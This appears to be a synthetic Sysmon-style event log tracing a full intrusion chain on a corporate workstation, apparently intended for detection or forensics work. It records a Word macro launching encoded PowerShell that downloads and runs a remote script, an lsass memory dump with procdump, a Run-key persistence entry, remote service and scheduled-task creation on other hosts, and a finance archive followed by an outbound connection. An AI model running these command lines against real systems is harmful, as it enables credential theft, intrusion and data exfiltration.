{"EventID":1,"UtcTime":"2025-01-12T08:14:03Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" C:\\Users\\jdoe\\Downloads\\Q1_Benefits_Update.docm","CurrentDirectory":"C:\\Users\\jdoe\\Downloads\","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentProcessGuid":"{SYS-0001}","ProcessGuid":"{A1-B1-C1}","ProcessId":4216,"IntegrityLevel":"Medium","Hashes":"SHA256=34A57B52746F2B6D86DA90C118D3767E9D4242B887A5500F94726A2A5D6F1140"}
{"EventID":1,"UtcTime":"2025-01-12T08:14:21Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9jZG4udXBkYXRlLXN1cHBvcnQuY29tL2Evb2ZmZXIucHMxJyk=","CurrentDirectory":"C:\\Users\\jdoe\\Downloads\","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentCommandLine":""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" C:\\Users\\jdoe\\Downloads\\Q1_Benefits_Update.docm","ParentProcessGuid":"{A1-B1-C1}","ProcessGuid":"{A1-B1-C2}","ProcessId":4352,"IntegrityLevel":"Medium","Hashes":"SHA256=7A3F6C1A11449A395D675C341E52A3D66AE2ED4B3AA09DBB6D06F3C9CF56476A"}
{"EventID":3,"UtcTime":"2025-01-12T08:14:27Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{A1-B1-C2}","ProcessId":4352,"Protocol":"tcp","SourceIp":"10.10.20.57","SourcePort":49713,"DestinationIp":"185.199.110.153","DestinationPort":443,"DestinationHostname":"cdn.update-support.com","Initiated":"true"}
{"EventID":11,"UtcTime":"2025-01-12T08:15:12Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{A1-B1-C2}","ProcessId":4352,"TargetFilename":"C:\\ProgramData\\stage\\adsvc.exe","CreationUtcTime":"2025-01-12T08:15:12Z","Hashes":"SHA256=F1F35C6AF70E96D653B5946DF3C8A9D6321AEB77911D944B4A05DB236E726A61"}
{"EventID":1,"UtcTime":"2025-01-12T08:16:04Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","CommandLine":"C:\\ProgramData\\stage\\adsvc.exe /quiet /persist","CurrentDirectory":"C:\\ProgramData\\stage\","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAA...","ParentProcessGuid":"{A1-B1-C2}","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"IntegrityLevel":"High","Hashes":"SHA256=F1F35C6AF70E96D653B5946DF3C8A9D6321AEB77911D944B4A05DB236E726A61"}
{"EventID":1,"UtcTime":"2025-01-12T08:18:42Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Tools\\procdump64.exe","CommandLine":"procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass_20250112.dmp","CurrentDirectory":"C:\\Tools\","ParentImage":"C:\\ProgramData\\stage\\adsvc.exe","ParentCommandLine":"C:\\ProgramData\\stage\\adsvc.exe /quiet /persist","ParentProcessGuid":"{A1-B1-C3}","ProcessGuid":"{A1-B1-C4}","ProcessId":4672,"IntegrityLevel":"High","Hashes":"SHA256=173B019E731DCFC5D33A4A96FD298F3C8B0B493F3811431DEB96D0CCB7C9EF04"}
{"EventID":11,"UtcTime":"2025-01-12T08:18:55Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Tools\\procdump64.exe","ProcessGuid":"{A1-B1-C4}","ProcessId":4672,"TargetFilename":"C:\\ProgramData\\lsass_20250112.dmp","CreationUtcTime":"2025-01-12T08:18:55Z","Hashes":"SHA256=A8D916C2BC2805B69F925C50E6DA93BFE66EBE004920D0A7E2720A35C5BF05A1"}
{"EventID":13,"UtcTime":"2025-01-12T08:19:07Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CloudTelemetry","Details":"C:\\ProgramData\\stage\\adsvc.exe /background","EventType":"SetValue"}
{"EventID":3,"UtcTime":"2025-01-12T08:25:15Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"Protocol":"tcp","SourceIp":"10.10.20.57","SourcePort":49800,"DestinationIp":"10.10.30.44","DestinationPort":445,"DestinationHostname":"APP-02.corp.local","Initiated":"true"}
{"EventID":3,"UtcTime":"2025-01-12T08:25:18Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"Protocol":"tcp","SourceIp":"10.10.20.57","SourcePort":49802,"DestinationIp":"10.10.30.44","DestinationPort":135,"DestinationHostname":"APP-02.corp.local","Initiated":"true"}
{"EventID":1,"UtcTime":"2025-01-12T08:25:43Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Windows\\System32\\sc.exe","CommandLine":"sc.exe \\\\APP-02 create TempUpdater binPath= C:\\Windows\\Temp\\updater.exe start= auto","CurrentDirectory":"C:\\Windows\\System32\","ParentImage":"C:\\ProgramData\\stage\\adsvc.exe","ParentCommandLine":"C:\\ProgramData\\stage\\adsvc.exe /quiet /persist","ParentProcessGuid":"{A1-B1-C3}","ProcessGuid":"{A1-B1-C5}","ProcessId":4892,"IntegrityLevel":"High","Hashes":"SHA256=8B715E6F634E9B1869E8C2A38069053D3F70A75D5BFE2B1F53B5A5B579AB1802"}
{"EventID":1,"UtcTime":"2025-01-12T08:27:11Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /Create /S DB-01 /RU SYSTEM /SC ONCE /TN UpdCache /TR "C:\\Windows\\Temp\\updater.exe" /ST 08:30","CurrentDirectory":"C:\\Windows\\System32\","ParentImage":"C:\\ProgramData\\stage\\adsvc.exe","ParentCommandLine":"C:\\ProgramData\\stage\\adsvc.exe /quiet /persist","ParentProcessGuid":"{A1-B1-C3}","ProcessGuid":"{A1-B1-C6}","ProcessId":4950,"IntegrityLevel":"High","Hashes":"SHA256=3D719A08F4F3A0E661A2EF77939D24E3A988D649A940B87AFD5BF0D6EC8D7B24"}
{"EventID":11,"UtcTime":"2025-01-12T08:32:41Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"TargetFilename":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\finance_q1.zip","CreationUtcTime":"2025-01-12T08:32:41Z","Hashes":"SHA256=16A462C224061262BBD8C1ED63D9B45235513DFB6A85D10DF94A28ED0F4D43F5"}
{"EventID":3,"UtcTime":"2025-01-12T08:33:09Z","Computer":"WKSTN-07.corp.local","User":"CORP\\jdoe","Image":"C:\\ProgramData\\stage\\adsvc.exe","ProcessGuid":"{A1-B1-C3}","ProcessId":4488,"Protocol":"tcp","SourceIp":"10.10.20.57","SourcePort":49980,"DestinationIp":"45.77.22.91","DestinationPort":443,"DestinationHostname":"storage.sync-preview.net","Initiated":"true"}